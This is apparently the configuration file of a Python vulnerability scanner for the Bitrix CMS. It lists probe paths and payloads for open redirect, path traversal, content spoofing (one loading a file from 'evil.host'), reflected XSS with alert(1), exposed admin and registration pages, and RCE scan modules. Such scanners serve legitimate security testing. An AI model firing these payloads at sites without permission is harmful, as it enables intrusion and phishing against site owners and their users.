class Config:
    """Scanner config"""
    
    TIMEOUT = 10
    THREADS = 5
    VERBOSE = False
    USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    
    # Bitrix versions
    BITRIX_VERSIONS = [
        (2021, '/bitrix/js/ui/vue/vue2/dev/src/bitrixvue.js'),
        (2020, '/bitrix/js/main/parambag/bundle.config.js'),
        (2019, '/bitrix/js/main/md5/bundle.config.js'),
        (2019, '/bitrix/js/main/usertype.js'),
        (2018, '/bitrix/js/main/gridtile/gridtile.min.js'),
        (2018, '/bitrix/js/main/pin/pin.js'),
        (2018, '/bitrix/js/main/core/core_webrtc.js'),
        (2017, '/bitrix/js/main/recorder/encoder.js'),
        (2017, '/bitrix/js/main/core/core_admin_interface.js'),
        (2016, '/bitrix/js/main/jquery/jquery-1.7.js'),
        (2016, '/bitrix/js/main/utils.js'),
        (2015, '/bitrix/js/main/rating_like.js'),
    ]
    
    # Info disclosure
    INFO_DISCLOSURE = [
        '/bitrix/tools/composite_data.php',
        '/bitrix/components/bitrix/main.numerator.edit.sequence/slider.php',
        '/bitrix/services/main/ajax.',
        '/bitrix/services/mobileapp/jn.php',
        '/bitrix/modules/main/admin/php_command_line.php',
        '/?USER_FIELD_MANAGER=1',
        '/bitrix/admin/restore_export.php',
        '/bitrix/admin/tools_index.php',
        '/bitrix/bitrix.php',
        '/bitrix/modules/main/ajax_tools.php',
        '/bitrix/php_interface/after_connect_d7.php',
        '/bitrix/themes/.default/.description.php',
        '/bitrix/components/bitrix/main.ui.selector/templates/.default/template.php',
        '/bitrix/components/bitrix/forum.user.profile.edit/templates/.default/interface.php',
        '/bitrix/wizards/bitrix/demo/public_files/ru/personal/desktop.php',
        '/bitrix/php_interface/dbquery_error.php',
        '/bitrix/templates/.default/subscribe/subscr_form.php'
    ]
    
    # Open Redirect
    OPEN_REDIRECT = [
        "/bitrix/redirect.php?goto=https://TARGET%252F:123@google.com/",
        "/bitrix/rk.php?goto=https://TARGET%252F:123@google.com/",
        "/bitrix/tools/track_mail_click.php?url=http://site%252F@google.com/",
        "/bitrix/redirect.php?goto=https://TARGET.com%252F:123@google.com/"
    ]
    
    # Admin panels
    ADMIN_PANELS = [
        '/bitrix/admin/',
        '/bitrix/components/bitrix/desktop/admin_settings.php',
        '/bitrix/tools/catalog_export/yandex_detail.php',
        '/bitrix/tools/upload.php',
    ]
    
    # Improper Registration
    REGISTRATION = [
        '/auth/?register=yes',
        '/crm/?register=yes',
        '/auth/oauth2/?register=yes',
        '/bitrix/wizards/bitrix/demo/public_files/ru/auth/index.php?register=yes',
        '/bitrix/wizards/bitrix/demo/public_files/en/auth/index.php?register=yes',
        '/bitrix/wizards/bitrix/demo/modules/examples/public/language/ru/examples/custom-registration/index.php',
        '/bitrix/wizards/bitrix/demo/modules/examples/public/language/en/examples/custom-registration/index.php',
        '/bitrix/wizards/bitrix/demo/modules/examples/public/language/ru/examples/my-components/news_list.php?register=yes',
        '/bitrix/wizards/bitrix/demo/modules/examples/public/language/en/examples/my-components/news_list.php?register=yes',
        '/bitrix/wizards/bitrix/demo/modules/subscribe/public/personal/subscribe/subscr_edit.php?register=yes',
        '/bitrix/modules/bitrix.siteinfoportal/install/wizards/bitrix/infoportal/site/public/ru/personal/profile/index.php?register=yes',
        '/bitrix/modules/bitrix.siteinfoportal/install/wizards/bitrix/infoportal/site/public/en/personal/profile/index.php?register=yes',
        '/bitrix/modules/bitrix.siteinfoportal/install/wizards/bitrix/infoportal/site/public/ru/board/my/index.php?register=yes',
        '/bitrix/modules/bitrix.siteinfoportal/install/wizards/bitrix/infoportal/site/public/en/board/my/index.php?register=yes',
        '/bitrix/wizards/bitrix/demo/indexes/ru/cancel/?register=yes',
        '/bitrix/wizards/bitrix/demo/indexes/en/cancel/?register=yes'
    ]
    
    # Path Traversal / LFI
    PATH_TRAVERSAL = [
        '/.htaccess/«/../..////////////////////////////bitrix//////////////////////////////virtual_file_system.php//////////////////////////////»/%2E%2E'
    ]
    # Content Spoofing
    CONTENT_SPOOFING = [
        '/bitrix/components/bitrix/mobileapp.list/ajax.php?items[1][TITLE]=TEXT+INJECTION!+PLEASE+CLICK+HERE!&items[1][DETAIL_LINK]=http://google.com',
        '/bitrix/tools/imagepg.php?img=//ceblog.s3.amazonaws.com/wp-content/uploads/2016/04/22110359/youve-been-hacked.png',
        '/bitrix/templates/learning/js/swfpg.php?img=//evil.host/evil.swf'
    ]
    
    # XSS
    XSS_URLS = [
        "/bitrix/components/bitrix/map.google.view/settings/settings.php?arParams[API_KEY]=123'-alert(1)-'",
        "/bitrix/components/bitrix/socialnetwork.events_dyn/get_message_2.php?log_cnt=<img onerror=alert(1) src=x>",
    ]
    
    # Scan levels
    SCAN_LEVELS = {
        'quick': ['basic_scan'],
        'normal': ['basic_scan', 'rce_vote'],
        'full': ['basic_scan', 'rce_vote', 'rce_object_injection', 'rce_phar']
    }
    
    def get_modules_for_level(self, level):
        return self.SCAN_LEVELS.get(level, self.SCAN_LEVELS['normal'])
